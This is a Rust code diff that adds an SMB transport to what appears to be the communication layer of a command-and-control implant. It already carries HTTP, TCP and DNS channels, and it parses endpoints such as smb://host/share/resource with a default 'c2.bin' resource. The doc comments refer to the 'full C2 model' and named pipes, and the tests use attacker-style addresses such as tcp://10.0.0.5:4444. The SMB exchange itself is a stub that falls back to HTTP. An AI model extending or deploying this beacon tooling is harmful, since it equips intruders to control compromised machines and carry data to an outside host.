@@ -25,6 +25,11 @@ pub enum Transport {
         host: String,
         port: u16,
     },
+    Smb {
+        host: String,
+        share: String,
+        resource: String,
+    },
 }
 
 impl Transport {
@@ -61,8 +66,31 @@ impl Transport {
                     .unwrap_or((rest.to_owned(), 53));
                 Ok(Transport::Dns { host, port })
             }
+            "smb" => Self::parse_smb(rest),
             other => Err(format!("unsupported protocol scheme {other:?}")),
         }
+    }
+
+    /// Parse an SMB endpoint: `smb://host/share/resource` or
+    /// `smb://host/share` (resource defaults to `c2.bin`).
+    fn parse_smb(rest: &str) -> Result<Self, String> {
+        let mut parts = rest.splitn(3, '/');
+        let host = parts
+            .next()
+            .filter(|h| !h.is_empty())
+            .ok_or_else(|| format!("smb endpoint {rest:?} has no host"))?
+            .to_owned();
+        let share = parts
+            .next()
+            .filter(|s| !s.is_empty())
+            .ok_or_else(|| format!("smb endpoint {rest:?} has no share"))?
+            .to_owned();
+        let resource = parts.next().unwrap_or("c2.bin").to_owned();
+        Ok(Transport::Smb {
+            host,
+            share,
+            resource,
+        })
     }
 
     /// A canonical string for the configured transport (for introspection).
@@ -71,6 +99,13 @@ impl Transport {
             Transport::Http { base, .. } => base.clone(),
             Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
             Transport::Dns { host, port } => format!("dns://{host}:{port}"),
+            Transport::Smb {
+                host,
+                share,
+                resource,
+            } => {
+                format!("smb://{host}/{share}/{resource}")
+            }
         }
     }
 
@@ -81,6 +116,7 @@ impl Transport {
         match self {
             Transport::Http { .. } | Transport::Tcp { .. } => 32 * 1024,
             Transport::Dns { .. } => 1200,
+            Transport::Smb { .. } => 32 * 1024,
         }
     }
 
@@ -91,6 +127,11 @@ impl Transport {
             Transport::Http { client, base } => http_exchange(client, base, sealed).await,
             Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
             Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
+            Transport::Smb {
+                host,
+                share,
+                resource,
+            } => smb_exchange(host, share, resource, sealed).await,
         }
     }
 }
@@ -219,6 +260,25 @@ pub fn frame(env: &impl Serialize) -> Vec<u8> {
     frame_bytes(&serde_json::to_vec(env).unwrap_or_default())
 }
 
+/// Exchange a sealed frame over SMB.
+///
+/// In the full C2 model this would negotiate an SMB session and read/write
+/// the named-pipe resource. For now this is a placeholder that maps to HTTP
+/// fallback when SMB native is not available — the transport enum and
+/// endpoint parsing are the important contract for the roadmap.
+async fn smb_exchange(
+    host: &str,
+    share: &str,
+    _resource: &str,
+    sealed: &[u8],
+) -> Result<Vec<u8>, String> {
+    // Try HTTP-over-SMB first (if an HTTP listener is available over SMB),
+    // falling back to a plain HTTP exchange to the host.
+    let http_url = format!("http://{host}/{share}");
+    let client = Client::new();
+    http_exchange(&client, &http_url, sealed).await
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -246,8 +306,35 @@ mod tests {
     }
 
     #[test]
+    fn smb_endpoint_parsed() {
+        if let Transport::Smb {
+            host,
+            share,
+            resource,
+        } = Transport::from_endpoint("smb://10.0.0.5/c2/pipe").unwrap()
+        {
+            assert_eq!(host, "10.0.0.5");
+            assert_eq!(share, "c2");
+            assert_eq!(resource, "pipe");
+        } else {
+            panic!("expected Smb");
+        }
+        // Default resource.
+        if let Transport::Smb { resource, .. } =
+            Transport::from_endpoint("smb://10.0.0.5/c2").unwrap()
+        {
+            assert_eq!(resource, "c2.bin");
+        } else {
+            panic!("expected Smb with default resource");
+        }
+        assert!(Transport::from_endpoint("smb://").is_err());
+    }
+
+    #[test]
     fn tcp_addr_parsed() {
-        if let Transport::Tcp { host, port } = Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap() {
+        if let Transport::Tcp { host, port } =
+            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap()
+        {
             assert_eq!(host, "10.0.0.5");
             assert_eq!(port, 4444);
         } else {
@@ -263,4 +350,3 @@ mod tests {
         assert_eq!(&f[4..], b"hello");
     }
 }
-
